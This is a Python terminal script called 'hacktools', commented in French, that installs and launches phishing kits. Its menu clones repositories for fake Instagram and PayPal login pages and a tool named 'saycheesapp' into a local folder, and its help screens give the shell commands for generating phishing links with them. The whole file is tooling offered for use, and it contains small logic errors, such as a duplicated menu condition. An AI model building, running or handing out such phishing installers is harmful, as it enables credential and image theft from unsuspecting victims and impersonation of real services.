#coding:utf-8

"""
	Cette aplication fonctionne sur Linux MacOS(X) ...
	Le code est en Python et non pas en bash(shell) pour l'executer vous devririés taper la commande suivante :
	python3 hacktools
	ATTANTION :
		Le code ne fonctionne pas sous windows car les comamde du terminal ne son pas les même
		Merci de votre compréhention en cas de probleme contacter moi à l'adresse mail suivante :
		juliedbac@gmail.com
"""
#------------------------------------#
#        VARIABLE & CONSTANTE        #
#------------------------------------#
username = "--"
on_off = True

printError="Désolé votre saisie est incorecte \n choisiser une option valide :"
#
#------------------------------------#

#------------------------------------#
#               MODULE               #
#------------------------------------#
import os
from time import sleep
#
#------------------------------------#

def println(number):
	k = 0
	while k < number :
		print("")
		k += 1


def conte_a_rebour(nombre, text=""):
	os.system("clear")
	while nombre > 0:
		print(text)
		print("\n\n\ntemps {}s".format(nombre))
		sleep(1)
		nombre-=1
		os.system("clear")
#------------------------------------#


while on_off:
#------------------------------------#
#           choix de nom             #
#------------------------------------#
	if username == "--":
		userNameChoise = input("[*]vouler-vous choisir un nom d'utilisateur ?\n[1]OUI\n[2]NON\n{}>".format(username))
		userNameChoise = str(userNameChoise)#									cast des valeur sasi dans le but de limité les erreur


		if userNameChoise=="1":
			username = input("Entrée votre nom d'utilisateur \n{}>".format(username))
			username = str(username)#											cast des valeur sasi dans le but de limité les erreur

		elif userNameChoise=="2":
			username = ">>"

		else :
			conte_a_rebour(5, printError)
#																				choix dune option entre instalation / utilisation / chager de nom / ou sortie de hacktools
	else:
		os.system("clear")
		print("[*]Choisir une option :\n\n[1]installation des outils \n[2]Aide \n[3]Changer de nom \n[4]sortie")
		userChoise = input("{}>".format(username))
		userChoise = str(userChoise)#											choix d'une option instalation 
		if userChoise == "1":#													menu userchoice
			os.system("clear")#													netoyage du terminal
			print("[*]Choisir une option :\n\n[1]installé les outils de phishing\n[2]installé Saycheesapp \n[3] \n[4]sortie")
			userChoise_tools = input("{}>".format(username))
			userChoise_tools = str(userChoise_tools)#							cast des valeur sasi dans le but de limité les erreur
			if userChoise_tools == "1":#										choix n°1 pour istaller les outils de phishing
				os.system("mkdir tools")
				os.system("git clone https://github.com/thelinuxproject/instagram tools/instagram")#	installation de instapump
				os.system("git clone https://github.com/thelinuxproject/paypal tools/paypal")#	installation de paypal
				os.system("clear")
				println(7)
				print("operation terminer...")
				conte_a_rebour(4)#												attente de 4 seconde	
			elif userChoise_tools == "2":#										choix n°1 pour istaller les outils de phishing
				os.system("mkdir tools")
				os.system("git clone https://github.com/thelinuxproject/saycheesapp tools/saycheesapp")#	installation de saycheesapp 
				os.system("clear")
				println(7)
				print("operation terminer...")
				conte_a_rebour(4)#												attente de 4 seconde	
			elif userChoise_tools == "4":#										choix n°4 pour quitter le choi de téléchargement des des depots
				userChoise = "0"#												retour au menu userchoice
			else :
				conte_a_rebour(5, printError)

		elif userChoise == "2":
			os.system("clear")
			print("[*]Aide pour :\n\n[1]phishing\n[2]saycheesapp \n[3] \n[4]sortie")
			user_choise_help = input("{}>".format(username))
			user_choise_help = str(user_choise_help)#								cast de la variable userChoise_ph
			
			if user_choise_help == "1":
				os.system("clear")
				print("[*]Aide pour :\n\n[1]instagram\n[2]paypal \n[3] \n[4]sortie")
				user_choise_ph = input("{}>".format(username))
				user_choise_ph = str(user_choise_ph)

				if user_choise_ph == "1":
					os.system("clear")
					conte_a_rebour(10, "\nCommandes pour créer un lien de phisning instagram sont les suivante :\n\n\n	•cd tools/instagram\n\n	•bash instagram.sh")

				elif user_choise_ph == "1":
					os.system("clear")
					conte_a_rebour(10, "\nCommandes pour créer un lien de phisning paypal sont les suivante :\n\n\n	•cd tools/paypal\n\n	•bash paypal.sh")

				else :
					conte_a_rebour(5, printError)

			elif user_choise_help == "2":
				os.system("clear")
				conte_a_rebour(10, "\nCommandes pour créer un lien de phisning paypal sont les suivante :\n\n\n	•cd tools/saycheesapp\n\n	•bash saycheesapp.sh")

			elif user_choise_help == "4":#										choix n°4 pour quitter le chois de l'outis
				userChoise = "0"#												retour au menu userchoice
			
			else :
				conte_a_rebour(5, printError)

		elif userChoise == "3":
			username = "--"#													retour au menu changer de nom
		elif userChoise == "4":
			on_off = 0#															sorti de hacktools
		else :
			conte_a_rebour(5, printError)
